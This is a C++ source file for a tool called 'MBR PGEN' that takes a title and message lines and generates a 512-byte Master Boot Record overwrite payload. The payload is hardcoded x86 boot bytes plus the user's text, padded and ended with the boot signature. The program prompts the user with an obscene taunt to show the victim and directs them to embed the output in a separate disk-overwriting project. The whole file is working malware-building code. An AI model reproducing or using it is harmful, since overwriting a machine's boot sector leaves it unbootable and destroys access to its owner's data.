#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <assert.h>

#define FMT_HEADER_ONLY 1

#include "fmt/format.h"


#if defined(_WIN32)
    #include <windows.h>
#else
    #include "fmt/color.h"
#endif

#define TITLE_LINE_LENGTH 60
#define TITLE_LINE_FULL_LENGTH 80
#define MESSAGE_LINE_LENGTH 80
/*
This program reads a title and a message and outputs
a format payload usable with an MBR Overwrite.
*/

#if defined(_WIN32)
void ClearConsole(HANDLE& CONSOLE_HANDLE){
    COORD topLeft = {0,0};
    CONSOLE_SCREEN_BUFFER_INFO screen;
    DWORD written;

    GetConsoleScreenBufferInfo(CONSOLE_HANDLE, &screen);
    FillConsoleOutputCharacterA(CONSOLE_HANDLE, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written);
    FillConsoleOutputAttribute(CONSOLE_HANDLE, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE, screen.dwSize.X * screen.dwSize.Y, topLeft, &written);
    SetConsoleCursorPosition(CONSOLE_HANDLE, topLeft);
}
#else
void ClearConsole(){
    // CSI[2J clears screen, CSI[H moves the cursor to top-left corner
    std::cout << "\x1B[2J\x1B[H";
}
#endif

#if defined(_WIN32)
void ChangeConsoleFontColor(HANDLE& CONSOLE_HANDLE, WORD COLOR){
    SetConsoleTextAttribute(CONSOLE_HANDLE, COLOR);
}

void ResetConsoleFontColor(HANDLE& CONSOLE_HANDLE){
    SetConsoleTextAttribute(CONSOLE_HANDLE, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE);
}

#endif

void PrintBanner(){
    std::string BANNER = R"(
       *         (      (                  )  
     (  `     (  )\ )   )\ ) (          ( /(  
     )\))(  ( )\(()/(  (()/( )\ )   (   )\()) 
    ((_)()\ )((_)/(_))  /(_)|()/(   )\ ((_)\  
    (_()((_|(_)_(_))   (_))  /(_))_((_) _((_) 
    |  \/  || _ ) _ \  | _ \(_)) __| __| \| | 
    | |\/| || _ \   /  |  _/  | (_ | _|| .` | 
    |_|  |_||___/_|_\  |_|     \___|___|_|\_|
                            Made by memzer0x
)";

    std::cout << BANNER << std::endl;
    return;
}


int main(int argc, char** argv, char** envp){
    // IF WE'RE ON WINDOWS GET STDHANDLE SO WE CAN CHANGE COLORS AND CLEAR SCREEN
#if defined(_WIN32)
    HANDLE CONSOLE_HANDLE = GetStdHandle(STD_OUTPUT_HANDLE);
#endif    
    // THOSE ARE THE MAIN VARIABLES OUR PROGRAM WILL USE
    std::string TITLE = "";
    size_t TITLE_LENGTH = 0;
    std::string MESSAGE = "";
    size_t MESSAGE_LENGTH = 0;
    std::string PAYLOAD = "";
    std::string PAYLOAD_BEGIN = "\xB8\x12\x00\xCD\x10\xBD\x18\x7C\xB9\xC2\x01\xB8\x01\x13\xBB\x0C\x00\xBA\x00\x00\xCD\x10\xE2\xFE\x02";
    std::string PAYLOAD_BEGIN_RAW = R"(\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\xc2\x01\xb8\x01\x13\xbb\x0c\x00\xba\x00\x00\xcd\x10\xe2\xfe\x02)";
    std::string PAYLOAD_END = "\x55\xAA"; // MBR ALWAYS END WITH THOSE 2 BYTES
    std::vector<std::string> MESSAGE_VEC = {""};
    
    // CLEAR CONSOLE, CHANGE FONT COLOR, PRINT BANNER, RESET FONT COLOR
    #if defined(_WIN32)
        ClearConsole(CONSOLE_HANDLE);
    #else
        ClearConsole();
    #endif
    #if defined(_WIN32)
        ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_GREEN);
    #endif
    PrintBanner();
    #if defined(_WIN32)
        ResetConsoleFontColor(CONSOLE_HANDLE);
    #endif

    // GET OUR TITLE
    std::cout << "[+] Please enter a title for the overwrite, we suggest something simple like \"Oops you've been fucked real hard in the ass.\" or something liek that ;)" << std::endl;
    std::cout << ">> ";
    while(std::getline(std::cin, TITLE)){
        if(TITLE.size() > 60){
            std::cout << "[!] The title can't be more than 60 characters ! (Length : " << TITLE.length() << ")" << std::endl << "[+] Please try again !" << std::endl << ">> "; 
        } else if(TITLE.length() > 0 && TITLE.length() <= 60) {
            break;
        }
        TITLE.clear();
    }
    TITLE_LENGTH = TITLE.length();

    #if defined(_WIN32)
        ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_GREEN);
    #endif
    std::cout << "[+] Choosed title : " << TITLE << std::endl;
    #if defined(_WIN32)
        ResetConsoleFontColor(CONSOLE_HANDLE);
    #endif
    // PREPARE THE TITLE WITH THE PAYLOAD
    if(TITLE_LENGTH <= 60){
        // IF WE NEED TO PAD A PAIR NUMBER
        if(((TITLE_LINE_LENGTH - TITLE_LENGTH) % 2) == 0){
            TITLE.insert(TITLE.begin(), ((TITLE_LINE_FULL_LENGTH - TITLE_LENGTH) / 2), '\x20'); // THIS WILL INSERT (PADDING / 2) AT THE BEGINNING OF THE TITLE
            TITLE.insert(TITLE.end(), ((TITLE_LINE_FULL_LENGTH - TITLE_LENGTH) / 2), '\x20'); // THIS WILL INSERT (PADDING / 2) AT THE END OF THE TITLE

        } else {
            // IF WE NEED TO PAD A UNPAIR NUMBER
            TITLE.insert(TITLE.begin(), (((TITLE_LINE_FULL_LENGTH - TITLE_LENGTH) / 2) + 1), '\x20');  // THIS WILL INSERT ((PADDING / 2) + 0.5) AT THE BEGINNING OF THE TITLE
            TITLE.insert(TITLE.end(), (((TITLE_LINE_FULL_LENGTH - TITLE_LENGTH) / 2)), '\x20');    // THIS WILL INSERT ((PADDING / 2) - 0.5) AT THE END OF THE TITLE
        }
    }

    assert(TITLE.length() == 80); // Here we make an assert because we wan't to make sure our TITLE is 80 in length

    // ADD A ENDLINE CHARACTER AT THE END OF OUR TITLE
    TITLE.insert(TITLE.end(), 2, '\x0a');

    // NOW WE NEED TO GET OUR USER MESSAGE AND SPLIT THIS MESSAGE PROPERLY.
    // WE NEED TO READ 5 LINES SO WE ARE LOOPING 5 TIMES
    for(int i = 0; i < 5; i++){
        std::cout << "[+] Please enter the " << i+1 << "th message line (80 characters maximum)" << (i > 0 ? "(type 'END' to stop reading)" : "") << (i > 0 ? "(type 'EMPTY' for a empty line)" : "") << std::endl;
        std::cout << ">> ";
        while(std::getline(std::cin, MESSAGE)){
            if(MESSAGE.length() > 80){
                // MESSAGE TOO LONG
                std::cout << "[!] A message line can't have more than 80 characters ! (Length : " << MESSAGE.length() <<")" << std::endl << "[+] Please try again !" << std::endl << ">> "; 
            } else if(MESSAGE.length() > 0 && MESSAGE.length() <= 80){
                break;
            }
            MESSAGE.clear();
        }
        if(i > 0){
            if(MESSAGE == "EMPTY"){
                MESSAGE.clear();
                MESSAGE.insert(MESSAGE.begin(), MESSAGE_LINE_LENGTH, '\x20');
                goto emptyskip;
            }
            if(MESSAGE == "END") break;
        }


        MESSAGE_LENGTH = MESSAGE.length();
        if(MESSAGE_LENGTH <= 80){
            if((MESSAGE_LINE_LENGTH - MESSAGE_LENGTH) % 2 == 0){
                MESSAGE.insert(MESSAGE.begin(), ((MESSAGE_LINE_LENGTH - MESSAGE_LENGTH) / 2), '\x20');
                MESSAGE.insert(MESSAGE.end(), ((MESSAGE_LINE_LENGTH - MESSAGE_LENGTH) / 2), '\x20');
            } else {
                MESSAGE.insert(MESSAGE.begin(), (((MESSAGE_LINE_LENGTH - MESSAGE_LENGTH) / 2) + 1), '\x20');
                MESSAGE.insert(MESSAGE.end(), ((MESSAGE_LINE_LENGTH - MESSAGE_LENGTH) / 2), '\x20');
            }
        }
emptyskip:
        assert(MESSAGE.length() == 80);
        #if defined(_WIN32)
            ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_GREEN);
        #endif
        std::cout << "[+] Line Entered : " << MESSAGE << std::endl;
        #if defined(_WIN32)
            ResetConsoleFontColor(CONSOLE_HANDLE);
        #endif

        // APPEND '\x0a' to our strings
        MESSAGE.insert(MESSAGE.end(), 1, '\x0a');
        MESSAGE_VEC.push_back(MESSAGE);
        MESSAGE.clear();
    }

    // OUTPUT THE WHOLE MESSAGE THAT WE ENTERED
    PAYLOAD += TITLE;
    std::for_each(MESSAGE_VEC.begin(), MESSAGE_VEC.end(), [&](std::string CURRENT_STRING){
        PAYLOAD += CURRENT_STRING;
    });
    
    #if defined(_WIN32)
        ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_GREEN);
    #endif

    std::cout << PAYLOAD_BEGIN << PAYLOAD << std::endl;

    #if defined(_WIN32)
        ResetConsoleFontColor(CONSOLE_HANDLE);
    #endif


    // ADD \x00 PADDING AT THE END OF OUR STRING
    if(PAYLOAD.length() + 25 > 510){
        #if defined(_WIN32)
            ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_RED);
        #endif
        std::cout << fmt::format("[+] Payload is longer than 510 bytes (current : {0}), shrinking the payload {1} times", PAYLOAD.length() + 25, (PAYLOAD.length() + 25) - 510)  << std::endl;
        #if defined(_WIN32)
            ResetConsoleFontColor(CONSOLE_HANDLE);
        #endif
        while(PAYLOAD.length() + 25 > 510){
            PAYLOAD.pop_back();
        }

    }

    PAYLOAD.insert(PAYLOAD.end(), 510 - (PAYLOAD.length() + 25), '\x00');
    
    //ADD THE LAST BYTES TO OUR PAYLOAD
    PAYLOAD += PAYLOAD_END;
    if(PAYLOAD.length() + 25 != 512){
        #if defined(_WIN32)
            ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_RED);
        #endif

        std::cout << fmt::format("[!] Payload is too long ! (Length : {0}) (MAX LENGTH : 512)", PAYLOAD.length()) << std::endl;
        std::cout << fmt::format("[+] Please remove {} characters from the message and try again.", PAYLOAD.length() - 512) << std::endl;

        #if defined(_WIN32)
            ResetConsoleFontColor(CONSOLE_HANDLE);
        #endif
    }
    // OUTPUT THE PAYLOAD GENERATED

    #if defined(_WIN32)
        ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_GREEN);
    #endif

    //OUTPUT THE BEGINNING OF THE PAYLOAD
    std::cout << "[+] Payload Generated : ";
    std::cout << PAYLOAD_BEGIN_RAW; 

    std::for_each(PAYLOAD.begin(), PAYLOAD.end(), [](unsigned char CURRENT_CHARACTER){
        if(fmt::format("{:x}", CURRENT_CHARACTER).length() == 1){
            std::cout << fmt::format("\\x{0:0>2x}", CURRENT_CHARACTER);
        } else {
            std::cout << fmt::format("\\x{0:x}", CURRENT_CHARACTER);
        }
    });

    #if defined(_WIN32)
        ResetConsoleFontColor(CONSOLE_HANDLE);
    #endif

    std::cout << std::endl << std::endl << "[?] What to do next ? Put the generated payload inside the following project (https://github.com/memzer0x/UselessDisk) before compiling it." << std::endl;

    return 0;
} 
